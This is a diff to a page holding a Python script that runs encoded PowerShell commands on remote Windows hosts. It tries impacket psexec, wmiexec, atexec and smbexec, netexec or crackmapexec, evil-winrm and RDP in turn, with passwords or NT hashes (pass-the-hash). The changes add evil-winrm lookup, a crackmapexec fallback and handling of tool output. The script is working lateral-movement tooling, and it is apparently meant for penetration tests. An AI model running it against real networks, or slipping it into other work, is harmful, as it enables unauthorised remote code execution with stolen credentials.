@@ -6,11 +6,13 @@ pagetitle:
 ```py
 #!/usr/bin/env python3
 import subprocess
+import os
 import base64
 import sys
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import threading
 import argparse
+import shutil
 
 EXEC_TIMEOUT = 15
 RDP_TIMEOUT = 45
@@ -20,7 +22,9 @@ VERBOSE = False
 OUTPUT = False
 
 VALID_TOOLS = ["winrm", "psexec", "ssh", "wmiexec", "atexec", "smbexec", "rdp"]
-NXC_TOOLS = ["winrm", "smbexec", "rdp"]
+
+IMPACKET_PREFIX = "impacket-"  # or "" for .py suffix
+NXC_CMD = "nxc"
 
 print_lock = threading.Lock()
 
@@ -141,6 +145,20 @@ def normalize_tool_name(name):
         return "winrm"
     return name
 
+# tricky, tricky exegol
+def find_evil_winrm():
+    if shutil.which("evil-winrm"):
+        return "evil-winrm"
+
+    base = "/usr/local/rvm/gems"
+    for d in os.listdir(base):
+        if d.endswith("@evil-winrm"):
+            p = f"{base}/{d}/wrappers/evil-winrm"
+            if os.path.isfile(p):
+                return p
+
+    raise FileNotFoundError("evil-winrm not found")
+
 def parse_tools_list(tools_str):
     """Parse comma-separated list of tools, validating each one."""
     tools = []
@@ -183,19 +201,20 @@ def build_cmd(tool, user, target, credential, command, show_output=False):
                 f"{cmd} {user}:{credential}@{target} 'powershell -enc {b64}'")
 
     if tool == "smbexec":
-        return (f"nxc smb {target} -H {hash_val} -u {user} -X 'powershell -enc {b64}' --exec-method smbexec{nxc_output_flag}"
+        return (f"{NXC_CMD} smb {target} -H {hash_val} -u {user} -X 'powershell -enc {b64}' --exec-method smbexec{nxc_output_flag}"
                 if use_hash else
-                f"nxc smb {target} -p {credential} -u {user} -X 'powershell -enc {b64}' --exec-method smbexec{nxc_output_flag}")
+                f"{NXC_CMD} smb {target} -p {credential} -u {user} -X 'powershell -enc {b64}' --exec-method smbexec{nxc_output_flag}")
 
+    # yes I know nxc has a winrm module which can oneshot commands, but evil-winrm has proved more robust
     if tool == "winrm":
-        return (f"nxc winrm {target} -H {hash_val} -u {user} -X 'powershell -enc {b64}'{nxc_output_flag}"
+        return (f"echo 'powershell -enc {b64}' | {find_evil_winrm()} -i {target} -u {user} -H {hash_val}"
                 if use_hash else
-                f"nxc winrm {target} -p {credential} -u {user} -X 'powershell -enc {b64}'{nxc_output_flag}")
+                f"echo 'powershell -enc {b64}' | {find_evil_winrm()} -i {target} -u {user} -p {credential}")
 
     if tool == "rdp":
-        return (f"echo 'y' | nxc rdp {target} -u {user} -H {hash_val} -X 'powershell -enc {b64}'{nxc_output_flag}"
+        return (f"echo 'y' | {NXC_CMD} rdp {target} -u {user} -H {hash_val} -X 'powershell -enc {b64}'{nxc_output_flag}"
                 if use_hash else
-                f"echo 'y' | nxc rdp {target} -u {user} -p {credential} -X 'powershell -enc {b64}'{nxc_output_flag}")
+                f"echo 'y' | {NXC_CMD} rdp {target} -u {user} -p {credential} -X 'powershell -enc {b64}'{nxc_output_flag}")
 
     raise Exception(f"Unknown tool: {tool}")
 
@@ -206,6 +225,10 @@ def run_chain(user, ip, credential, command, tool_list=None, show_output=False):
         # Can't pass the hash with SSH
         if tool == "ssh" and is_nthash(credential):
             safe_print(f"  [-] Skipping SSH for {ip}: cannot pass the hash.")
+            continue
+
+        if tool == "rdp" and NXC_CMD == "crackmapexec":
+            safe_print(f"  [-] Skipping RDP for {ip}: crackmapexec does not support running commands via RDP.")
             continue
 
         cmd = build_cmd(tool, user, ip, credential, command, show_output)
@@ -226,7 +249,7 @@ def run_chain(user, ip, credential, command, tool_list=None, show_output=False):
             safe_print(f"  [-] For {ip}: {tool} timed out.")
             continue
 
-        # psexec can have [-] if some shares are writeable and others arent
+        # psexec can have "[-]" in stdout if some shares are writeable and others aren't
         if tool == "psexec":
             if "Found writable share" in out:
                 if "Stopping service" in out:
@@ -241,10 +264,12 @@ def run_chain(user, ip, credential, command, tool_list=None, show_output=False):
                 safe_print(f"  [-] For {ip}: {tool} failed.")
                 continue
 
-        if (tool == "winrm" or tool == "smbexec" or tool == "atexec") and '[-]' in out:
+        
+        if (tool == "smbexec" or tool == "atexec") and '[-]' in out:
             safe_print(f"  [-] For {ip}: {tool} failed.")
             continue
         
+        # nxc tools will sometimes just fail silently
         if (tool == "smbexec" or tool == "rdp") and rc == 0 and out == "":
             safe_print(f"  [-] For {ip}: {tool} failed.")
             continue
@@ -256,7 +281,8 @@ def run_chain(user, ip, credential, command, tool_list=None, show_output=False):
                 safe_print(f"  [-] For {ip}: {tool} failed.")
             continue
 
-        if rc == 0:
+        # one-shotting using evil-winrm results in a return code of 1
+        if rc == 0 or (tool == "winrm" and rc == 1 and "NoMethodError" in out): 
             return (tool, out, cmd)
 
         safe_print(f"  [-] For {ip}: {tool} failed.")
@@ -335,29 +361,38 @@ def parse_args():
 
     return args
 
-IMPACKET_PREFIX = "impacket-"  # or "" for .py suffix
+
 
 def check_dependencies():
     """Check if required tools are installed."""
     global IMPACKET_PREFIX
-    
-    # Check nxc
-    result = subprocess.run("nxc -h", shell=True, capture_output=True)
-    if result.returncode != 0:
-        print("[-] nxc not found. Install with: pipx install netexec")
-        sys.exit(1)
-    
+    global NXC_CMD
+
     # Check impacket (either impacket-psexec or psexec.py)
-    r1 = subprocess.run("impacket-psexec --help", shell=True, capture_output=True)
-    r2 = subprocess.run("psexec.py --help", shell=True, capture_output=True)
-    if r1.returncode == 0:
+    r1 = shutil.which("impacket-psexec")
+    r2 = shutil.which("psexec.py")
+    if r1:
         IMPACKET_PREFIX = "impacket-"
-    elif r2.returncode == 0:
+    elif r2:
         IMPACKET_PREFIX = ""
     else:
         print("[-] impacket not found. Install with: pipx install impacket")
         sys.exit(1)
-
+    
+    # Check nxc/crackmapexec
+    r1 = shutil.which("nxc")
+    r2 = shutil.which("netexec")
+    r3 = shutil.which("crackmapexec")
+    if r1:
+        NXC_CMD = "nxc"
+    elif r2:
+        NXC_CMD = "netexec"
+    elif r3:
+        NXC_CMD = "crackmapexec"
+    else:
+        print("[-] netexec not found. Install with: pipx install git+https://github.com/Pennyw0rth/NetExec")
+        sys.exit(1)
+    
 def impacket_cmd(tool):
     """Return the correct impacket command name based on install type."""
     if IMPACKET_PREFIX:
